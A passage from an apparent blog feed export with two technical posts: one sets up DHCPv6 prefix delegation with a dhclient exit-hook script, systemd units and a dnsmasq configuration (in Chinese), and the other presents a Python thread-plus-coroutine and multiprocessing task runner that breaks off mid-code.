class="line">    iface=$(<span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$STATE_DIR</span>/iaid_<span class="variable">$iaid</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># we&#x27;re not changing the mapping, but we call update anyway mostly</span></span><br><span class="line">    <span class="comment"># as a `touch` for the code below that checks the time</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$iface</span>&quot;</span></span><br><span class="line">    set_iaid_mapping <span class="string">&quot;<span class="variable">$iaid</span>&quot;</span> <span class="string">&quot;<span class="variable">$iface</span>&quot;</span></span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># we haven&#x27;t - so let&#x27;s see if we have an interfaces not-yet-mapped</span></span><br><span class="line">  known=<span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> file <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$STATE_DIR</span>&quot;</span>/iaid_*; <span class="keyword">do</span></span><br><span class="line">    known=<span class="string">&quot;<span class="variable">$known</span> <span class="subst">$(cat <span class="string">&quot;<span class="variable">$file</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  <span class="keyword">for</span> iface <span class="keyword">in</span> <span class="variable">$INT_IFACE</span> <span class="variable">$OTHER_IFACES</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> kface <span class="keyword">in</span> <span class="variable">$known</span>; <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$kface</span>&quot;</span> = <span class="string">&quot;<span class="variable">$iface</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">continue</span> 2</span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="comment"># This interface is not yet mapped, return it</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$iface</span></span><br><span class="line">    set_iaid_mapping <span class="string">&quot;<span class="variable">$iaid</span>&quot;</span> <span class="string">&quot;<span class="variable">$iface</span>&quot;</span></span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># OK, all of our interfaces are mapped, but none of them is this one, so we&#x27;ll</span></span><br><span class="line">  <span class="comment"># just return the least-recently touched file. This is a bit odd, because</span></span><br><span class="line">  <span class="comment"># we&#x27;ll end up populating them in the reverse order, but we won&#x27;t just end up</span></span><br><span class="line">  <span class="comment"># re-doing one we just did</span></span><br><span class="line">  <span class="comment"># shellcheck disable=SC2012</span></span><br><span class="line">  last=$(<span class="built_in">ls</span> -t <span class="variable">$STATE_DIR</span>/iaid_* | <span class="built_in">tail</span> -n 1)</span><br><span class="line">  iface=$(<span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$last</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">rm</span> -f <span class="string">&quot;<span class="variable">$last</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$iface</span>&quot;</span></span><br><span class="line">  set_iaid_mapping <span class="string">&quot;<span class="variable">$iaid</span>&quot;</span> <span class="string">&quot;<span class="variable">$iface</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">ipv6_prefix_setup</span></span>() &#123;</span><br><span class="line">  <span class="comment"># new_iaid comes from DHCP</span></span><br><span class="line">  <span class="comment"># shellcheck disable=SC2154</span></span><br><span class="line">  <span class="built_in">local</span> iface=$(get_interface <span class="string">&quot;<span class="variable">$new_iaid</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">local</span> current_ip=$(/sbin/ip -6 addr show dev <span class="string">&quot;<span class="variable">$iface</span>&quot;</span> scope global | /usr/bin/awk <span class="string">&#x27;/inet6/ &#123;print $2&#125;&#x27;</span>)</span><br><span class="line">  <span class="built_in">local</span> new_ip=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$new_ip6_prefix</span>&quot;</span> | /bin/sed -E <span class="string">&#x27;s@::/([0-9]&#123;2&#125;)@::1/64@&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># shellcheck disable=SC2154</span></span><br><span class="line">  <span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$current_ip</span>&quot;</span> ] || ! [ <span class="string">&quot;<span class="variable">$current_ip</span>&quot;</span> = <span class="string">&quot;<span class="variable">$new_ip</span>&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># Setup the new IP</span></span><br><span class="line">    <span class="comment"># Note that no matter what size prefix we were given, you have to make</span></span><br><span class="line">    <span class="comment"># it a /64 for autoconfig to work, so we cut it down to /64</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># TODO for the future - if your ISP gives us bigger than a /54, allow</span></span><br><span class="line">    <span class="comment"># the user to cut it up instead of requesting multiple</span></span><br><span class="line">    <span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$current_ip</span>&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">      ip -6 addr del <span class="string">&quot;<span class="variable">$current_ip</span>&quot;</span> dev <span class="string">&quot;<span class="variable">$iface</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    ip -6 addr add <span class="string">&quot;<span class="variable">$new_ip</span>&quot;</span> dev <span class="string">&quot;<span class="variable">$iface</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Ensure we&#x27;ll get router advertisements</span></span><br><span class="line">    sysctl -w <span class="string">&quot;net.ipv6.conf.<span class="variable">$EXT_IFACE</span>.accept_ra=2&quot;</span></span><br><span class="line">    <span class="comment"># Needed for kernels before 2.6.37, don&#x27;t worry,</span></span><br><span class="line">    <span class="comment"># forwarding will still work as long as you have it set</span></span><br><span class="line">    <span class="comment"># on your other interface.</span></span><br><span class="line">    <span class="comment">#sysctl -w &quot;net.ipv6.conf.$EXT_IFACE.forwarding=1&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#systemctl start dnsmasq</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># interface comes from DHCP</span></span><br><span class="line"><span class="comment"># shellcheck disable=SC2154</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$interface</span>&quot;</span> != <span class="string">&quot;<span class="variable">$EXT_IFACE</span>&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">return</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reason comes from DHCP</span></span><br><span class="line"><span class="comment"># shellcheck disable=SC2154</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$reason</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">  BOUND6|REBIND6)</span><br><span class="line">    <span class="comment"># We will get called twice here - once for the temp address</span></span><br><span class="line">    <span class="comment"># and once for the prefix. We only care about the prefix.</span></span><br><span class="line">    <span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$new_ip6_prefix</span>&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">      ipv6_prefix_setup</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    ;;</span><br><span class="line">  RELEASE)</span><br><span class="line">    ext_iface_pid=<span class="string">&quot;/var/run/dhclient6.<span class="variable">$&#123;EXT_IFACE&#125;</span>.pid&quot;</span></span><br><span class="line">    <span class="keyword">if</span> [ -e <span class="string">&quot;<span class="variable">$ext_iface_pid</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;Shutting down dhclient6.<span class="variable">$&#123;EXT_IFACE&#125;</span> via SIGINT&quot;</span></span><br><span class="line">      <span class="built_in">kill</span> <span class="string">&quot;<span class="subst">$(cat <span class="string">&quot;<span class="variable">$ext_iface_pid</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><h2 id="systemd启动脚本"><a href="#systemd启动脚本" class="headerlink" title="systemd启动脚本"></a>systemd启动脚本</h2><p><code>dhcpv6-pd.service</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=DHCPv6-PD Service</span><br><span class="line">Wants=NetworkManager-wait-online.service</span><br><span class="line">After=NetworkManager-wait-online.service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">Restart=on-failure</span><br><span class="line">User=root</span><br><span class="line">RestartSec=5s</span><br><span class="line">ExecStart=/usr/sbin/dhclient -6 -d -v -P -lf /var/lib/dhcp/dhclient6.eth0.leases eth0</span><br><span class="line">LimitNOFILE=1048576</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><blockquote><p>注意，必须在确保<code>eth0</code>和<code>vbr0</code>创建成功后启动，这里使用的是<code>Network-Manager</code>，故<code>After=NetworkManager-wait-online.service</code>，其他的网络管理器需要对应调整</p></blockquote><h1 id="dnsmasq配置"><a href="#dnsmasq配置" class="headerlink" title="dnsmasq配置"></a>dnsmasq配置</h1><p><code>dnsmasq</code>作用是<code>DHCPv6 Server</code>（下发DHCPv6地址和DNS等参数）&amp;<code>RA</code>（下发IPv6路由通告）。</p><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>新建文件<code>/etc/dnsmasq.d/dhcpv6-server</code>：</p><blockquote><p>配置项意义参考<code>dnsmasq</code>的<code>man手册</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">interface=vbr0</span><br><span class="line">port=0</span><br><span class="line">bind-interfaces</span><br><span class="line"></span><br><span class="line">dhcp-range=set:rangev4, 192.168.99.2, 192.168.99.254, 255.255.255.0</span><br><span class="line">dhcp-option=tag:rangev4, option:dns-server, 223.5.5.5</span><br><span class="line">dhcp-range=set:rangev6, ::100, ::ffff, constructor:vbr0, slaac, 64, 7200</span><br><span class="line">dhcp-option=tag:rangev6, option6:dns-server, [2400:3200::1]</span><br><span class="line">enable-ra</span><br><span class="line">ra-param=vbr0, 600, 7200</span><br><span class="line">dhcp-leasefile=/var/lib/dhcp/dnsmasq.leases</span><br><span class="line">cache-size=150</span><br><span class="line"></span><br><span class="line">log-dhcp</span><br><span class="line"></span><br><span class="line">dhcp-name-match=set:wpad-ignore,wpad</span><br><span class="line">dhcp-ignore-names=tag:wpad-ignore</span><br></pre></td></tr></table></figure><h2 id="systemd启动脚本-1"><a href="#systemd启动脚本-1" class="headerlink" title="systemd启动脚本"></a>systemd启动脚本</h2><p><code>dnsmasq.service</code>：</p><blockquote><p>正常安装<code>dnsmasq</code>会自动生成<code>dnsmasq.service</code>，同样的，要确保<code>vbr0</code>已创建成功后启动，所以<code>Wants</code>&amp;<code>After</code>后追加<code>NetworkManager-wait-online.service</code>，此service脚本供参考。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=dnsmasq - A lightweight DHCP and caching DNS server</span><br><span class="line">Requires=network.target</span><br><span class="line">Wants=nss-lookup.target NetworkManager-wait-online.service</span><br><span class="line">Before=nss-lookup.target</span><br><span class="line">After=network.target NetworkManager-wait-online.service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl <span class="built_in">enable</span> dhcpv6-pd</span><br><span class="line">systemctl start dhcpv6-pd</span><br><span class="line">systemctl <span class="built_in">enable</span> dnsmasq</span><br><span class="line">systemctl start dnsmasq</span><br></pre></td></tr></table></figure><h1 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h1><h2 id="上联源端口更换，从eth0变成了wlan0，怎么修改？"><a href="#上联源端口更换，从eth0变成了wlan0，怎么修改？" class="headerlink" title="上联源端口更换，从eth0变成了wlan0，怎么修改？"></a>上联源端口更换，从eth0变成了wlan0，怎么修改？</h2><p>替换<code>/etc/dhcp/dhclient-exit-hooks.d/dhcpv6-pd</code>和<code>dhcpv6-pd.service</code>对应的端口名称。</p><h2 id="下联网桥更换，从vbr0变成了bridge0，怎么修改？"><a href="#下联网桥更换，从vbr0变成了bridge0，怎么修改？" class="headerlink" title="下联网桥更换，从vbr0变成了bridge0，怎么修改？"></a>下联网桥更换，从vbr0变成了bridge0，怎么修改？</h2><p>替换<code>/etc/dhcp/dhclient-exit-hooks.d/dhcpv6-pd</code>和<code>/etc/dnsmasq.d/dhcpv6-server</code>对应的端口名称。</p>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
          <category> DHCP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IPv6 </tag>
            
            <tag> 路由 </tag>
            
            <tag> DHCPv6-PD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python async异步并发</title>
      <link href="/2023/04/02/Tools/concurrency/"/>
      <url>/2023/04/02/Tools/concurrency/</url>
      
        <content type="html"><![CDATA[<h1 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h1><h2 id="线程-协程"><a href="#线程-协程" class="headerlink" title="线程+协程"></a>线程+协程</h2><p>采取双线程方式，主线程负责协程队列的任务动态新增，子线程负责协程队列的执行。另外提供一个多进程加载入口</p><blockquote><p>ChangeLog: 使用Task&#x2F;Future的原生获取协程返回值方法 </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Time    : 2024-06-04 19:23:00</span></span><br><span class="line"><span class="comment"># @Author  : m0ch</span></span><br><span class="line"><span class="comment"># @Version : 2.0</span></span><br><span class="line"><span class="comment"># @License : GPLv2.0</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> AsyncResult</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Callable</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MultiAsyncTask</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, concurrency=<span class="number">200</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>._thread_loop = asyncio.new_event_loop()</span><br><span class="line">        threading.Thread(target=<span class="variable language_">self</span>._start_thread_loop, daemon=<span class="literal">True</span>).start()</span><br><span class="line">        <span class="variable language_">self</span>._semaphore = asyncio.Semaphore(concurrency)</span><br><span class="line">        <span class="variable language_">self</span>._lock = threading.Lock()</span><br><span class="line">        <span class="variable language_">self</span>._event = threading.Event()</span><br><span class="line">        <span class="variable language_">self</span>._running = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_start_thread_loop</span>(<span class="params">self</span>):</span><br><span class="line">        asyncio.set_event_loop(<span class="variable language_">self</span>._thread_loop)</span><br><span class="line">        <span class="variable language_">self</span>._thread_loop.run_forever()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close_wait</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>._event.wait()</span><br><span class="line">        <span class="variable language_">self</span>._thread_loop.call_soon_threadsafe(<span class="variable language_">self</span>._thread_loop.stop)</span><br><span class="line">        <span class="keyword">while</span> <span class="variable language_">self</span>._thread_loop.is_running():</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="variable language_">self</span>._thread_loop.close()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="comment"># print(type(e), e)</span></span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_closed</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._thread_loop.is_closed()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run_task</span>(<span class="params">self, func: <span class="type">Callable</span>, args=(<span class="params"></span>), kwargs=&#123;&#125;</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="variable language_">self</span>._lock:</span><br><span class="line">            <span class="variable language_">self</span>._running += <span class="number">1</span></span><br><span class="line">        result = asyncio.run_coroutine_threadsafe(<span class="variable language_">self</span>._warp(func, args, kwargs), <span class="variable language_">self</span>._thread_loop)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run_tasks_unsafe</span>(<span class="params">self, tasks: <span class="built_in">list</span>[<span class="built_in">tuple</span>[<span class="type">Callable</span>, <span class="built_in">tuple</span>, <span class="built_in">dict</span>]]</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;This function is not safe! Refer to https://zhuanlan.zhihu.com/p/602955920.</span></span><br><span class="line"><span class="string">        python&gt;=3.12 seems to resolve this.&quot;&quot;&quot;</span></span><br><span class="line">        task_loops: <span class="built_in">list</span>[asyncio.Task] = []</span><br><span class="line">        <span class="keyword">for</span> func, args, kwargs <span class="keyword">in</span> tasks:</span><br><span class="line">            task = <span class="variable language_">self</span>._thread_loop.create_task(<span class="variable language_">self</span>._warp(func, args, kwargs))</span><br><span class="line">            task_loops.append(task)</span><br><span class="line">        <span class="keyword">with</span> <span class="variable language_">self</span>._lock:</span><br><span class="line">            <span class="variable language_">self</span>._running += <span class="built_in">len</span>(task_loops)</span><br><span class="line">        <span class="comment"># result = asyncio.run_coroutine_threadsafe(asyncio.wait(task_loops), self._thread_loop)</span></span><br><span class="line">        <span class="keyword">return</span> task_loops</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run_tasks</span>(<span class="params">self, tasks: <span class="built_in">list</span>[<span class="built_in">tuple</span>[<span class="type">Callable</span>, <span class="built_in">tuple</span>, <span class="built_in">dict</span>]]</span>):</span><br><span class="line">        results: <span class="built_in">list</span>[asyncio.Future] = []</span><br><span class="line">        <span class="keyword">with</span> <span class="variable language_">self</span>._lock:</span><br><span class="line">            <span class="variable language_">self</span>._running += <span class="built_in">len</span>(tasks)</span><br><span class="line">        <span class="keyword">for</span> func, args, kwargs <span class="keyword">in</span> tasks:</span><br><span class="line">            result = asyncio.run_coroutine_threadsafe(<span class="variable language_">self</span>._warp(func, args, kwargs), <span class="variable language_">self</span>._thread_loop)</span><br><span class="line">            results.append(result)</span><br><span class="line">        <span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">_warp</span>(<span class="params">self, func: <span class="type">Callable</span>, args: <span class="built_in">tuple</span>, kwargs: <span class="built_in">dict</span></span>):</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">self</span>._semaphore.acquire()</span><br><span class="line">        <span class="comment"># start</span></span><br><span class="line">        result = <span class="keyword">await</span> func(*args, **kwargs)</span><br><span class="line">        <span class="comment"># await asyncio.sleep(2)</span></span><br><span class="line">        <span class="comment"># end</span></span><br><span class="line">        <span class="variable language_">self</span>._semaphore.release()</span><br><span class="line">        <span class="keyword">with</span> <span class="variable language_">self</span>._lock:</span><br><span class="line">            <span class="variable language_">self</span>._running -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>._running == <span class="number">0</span>:</span><br><span class="line">            <span class="variable language_">self</span>._event.<span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_run_async_tasks</span>(<span class="params">tasks: <span class="built_in">list</span>[<span class="built_in">tuple</span>[<span class="type">Callable</span>, <span class="built_in">tuple</span>, <span class="built_in">dict</span>]], concurrency: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="comment"># print(&#x27;Worker process %s.&#x27; % os.getpid())</span></span><br><span class="line">    mt = MultiAsyncTask(concurrency)</span><br><span class="line">    results = mt.run_tasks(tasks)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> mt.is_closed():</span><br><span class="line">        mt.close_wait()</span><br><span class="line">    real_results = [result.result() <span class="keyword">for</span> result <span class="keyword">in</span> results]</span><br><span class="line">    <span class="keyword">return</span> real_results</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_tasks_multiprocess</span>(<span class="params">tasks: <span class="built_in">list</span>[<span class="built_in">tuple</span>[<span class="type">Callable</span>, <span class="built_in">tuple</span>, <span class="built_in">dict</span>]], pnum: <span class="built_in">int</span> = <span class="literal">None</span>, cnum: <span class="built_in">int</span> = <span class="number">200</span></span>):</span><br><span class="line">    <span class="comment"># print(&#x27;Master process %s.&#x27; % os.getpid())</span></span><br><span class="line">    pnum = pnum <span class="keyword">or</span> os.cpu_count() - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tasks) &lt; pnum:</span><br><span class="line">        pnum = <span class="number">1</span></span><br><span class="line">    <span class="comment"># seprated_coros_s = [[] for _ in range(pnum)]</span></span><br><span class="line">    <span class="comment"># for i, task in enumerate(tasks):</span></span><br><span class="line">    <span class="comment">#     seprated_coros_s[i % pnum].append(task)    </span></span><br><span class="line">    t_len = math.ceil(<span class="built_in">len</span>(tasks)/pnum)</span><br><span class="line">    seprated_coros_s = [tasks[i:i+t_len] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(tasks), t_len)]</span><br><span class="line"></span><br><span class="line">    p = multiprocessing.Pool(pnum)</span><br><span class="line">    p_results: <span class="built_in">list</span>[AsyncResult] = []</span><br><span class="line">    <span class="keyword">for</span> seprated_coros <span class="keyword">in</span> seprated_coros_s:</span><br><span class="line">        p_result = p.apply_async(_run_async_tasks, args=(seprated_coros, cnum))</span><br><span class="line">        p_results.append(p_result)</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line"></span><br><span class="line">    task_results: <span class="built_in">list</span>[asyncio.Future] = []</span><br><span class="line">    <span class="keyword">for</span> p_result <span class="keyword">in</span> p_results:</span><br><span class="line">        task_results.extend(p_result.get())</span><br><span class="line">    <span class="keyword">return</span> task_results</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">coro_test</span>(<span class="params">i: <span class="built_in">int</span></span>):</span><br><span class="line">        <span class="keyword">await</span> asyncio.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        <span class="keyword">return</span> i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">        tasks.append((coro_test, (i,), &#123;&#125;))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># mt = MultiAsyncTask(concurrency=2000)</span></span><br><span class="line">    <span class="comment"># now = time.time()</span></span><br><span class="line">    <span class="comment"># tr = mt.run_tasks_unsafe(tasks)</span></span><br><span class="line">    <span class="comment"># for r in tr:</span></span><br><span class="line">    <span class="comment">#     while not r.done():</span></span><br><span class="line">    <span class="comment">#         time.sleep(0.1)</span></span><br><span class="line">    <span class="comment">#     r.result()</span></span><br><span class="line">    <span class="comment">#     # print(r.result())</span></span><br><span class="line">    <span class="comment"># if not mt.is_closed():</span></span><br><span class="line">    <span class="comment">#     mt.close_wait()</span></span><br><span class="line">    <span class="comment"># print(time.time()-now, &quot;s&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># mt = MultiAsyncTask(concurrency=2000)</span></span><br><span class="line">    <span class="comment"># now = time.time()</span></span><br><span class="line">    <span class="comment"># tr = mt.run_tasks(tasks)</span></span><br><span class="line">    <span class="comment"># for r in tr:</span></span><br><span class="line">    <span class="comment">#     r.result()</span></span><br><span class="line">    <span class="comment">#     # print(r.result())</span></span><br><span class="line">    <span class="comment"># if not mt.is_closed():</span></span><br><span class="line">    <span class="comment">#     mt.close_wait()</span></span><br><span class="line">    <span class="comment"># print(time.time()-now, &quot;s&quot;)</span></span><br><span class="line"></span><br><span class="line">    now = time.time()</span><br><span class="line">    task_results = run_tasks_multiprocess(tasks, pnum=<span class="number">0</span>, cnum=<span class="number">2000</span>)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> task_results:</span><br><span class="line">        r</span><br><span class="line">        <span class="comment"># print(&quot;result: &quot;, 